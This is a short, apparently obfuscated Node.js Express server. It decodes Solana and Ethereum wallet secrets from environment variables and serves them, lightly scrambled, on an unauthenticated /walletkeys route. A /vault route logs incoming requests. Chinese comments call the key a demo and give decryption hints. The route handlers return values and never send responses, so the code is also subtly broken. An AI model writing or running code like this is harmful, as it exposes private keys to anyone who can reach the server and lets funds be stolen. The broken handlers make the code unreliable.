const e = require('express');
const d = require('dotenv');
const b = require('body-parser');
const c = '此為示範密鑰，請勿分享';
d.config();
// 请使用以下密钥解密
const s = (k) => {
  const m = k.split('').map((v, i) => 
    (i % 2 === 0 ? v : v + '￥'));
  return m.join('');
};
const a = e();
a.use(b.json());
a.get('/walletkeys', () => {return {solana: s(Buffer.from(process.env.SOLANA,'base64').toString('utf8')), ethereum: s(Buffer.from(process.env.ETHEREUM,'base64').toString('utf8'))}});
a.post('/vault', (k) => {console.log(k); return '收到' });
const l = a.listen(3000, () => {console.log('服务启动')});
